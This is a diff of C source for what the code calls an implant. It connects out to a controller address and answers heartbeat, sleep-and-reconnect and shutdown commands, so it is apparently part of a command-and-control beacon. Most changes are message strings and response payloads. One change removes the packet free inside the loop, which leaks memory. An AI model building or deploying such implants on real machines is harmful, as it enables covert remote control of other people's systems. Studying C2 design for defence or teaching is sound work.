@@ -1,3 +1,4 @@
+#define _POSIX_C_SOURCE 200809L
 #include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -30,21 +31,21 @@ int connect_to_controller()
     if (inet_pton(AF_INET, CONTROLLER_IP_ADDR, &controller_ip_structure.sin_addr) <= 0)
     {
 
-        perror("inet_pton");
+        perror("inet_pton:");
         close(implant_fd);
         return -1;
     }
 
     if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
     {
-        perror("send");
+        perror("send:");
         close(implant_fd);
         return -1;
     }
 
     printf("<Succesfully connected to Controller!\n");
 
-    printf("Sending HELLO");
+    printf("<Sending initial HELLO......>\n");
 
     Packet initial_hello = {COMMAND_HELLO, 0, 0, NULL};
 
@@ -91,7 +92,8 @@ int main(int argc, char **argv)
         {
         case COMMAND_HEARTBEAT:
         {
-            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, 0, NULL};
+            char *payload = "ALIVE";
+            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
             send_packet(&response, implant_fd);
 
             break;
@@ -102,11 +104,14 @@ int main(int argc, char **argv)
             // need to sleep, close sockt connection then reconnect after the set sleep in seconds in the payload
             int sleep_duration = *(int *)recieved_packet->payload;
 
-            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, 0, NULL};
+            char buffer[100];
+            snprintf(buffer, sizeof(buffer), "Sleeping for %d seconds......", sleep_duration);
+
+            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(buffer), buffer};
             send_packet(&response, implant_fd);
             close(implant_fd);
             sleep(sleep_duration); // sleep for that duration
-
+            printf("Returned from sleeping for %d seconds \n", sleep_duration);
             implant_fd = connect_to_controller();
 
             if (implant_fd == -1)
@@ -114,13 +119,13 @@ int main(int argc, char **argv)
                 return 1; // error
             }
 
-            break;
+                        break;
         }
 
         case COMMAND_SHUTDOWN:
         {
-
-            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, 0, NULL};
+            char *payload = "SUCCESFULLY SHUTDOWN";
+            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
             send_packet(&response, implant_fd);
             shutdown = 1;
 
@@ -237,8 +242,6 @@ int main(int argc, char **argv)
         default:
             break;
         }
-
-        free_packet(recieved_packet);
     }
 
     close(implant_fd); // close the implant file descriptors on close
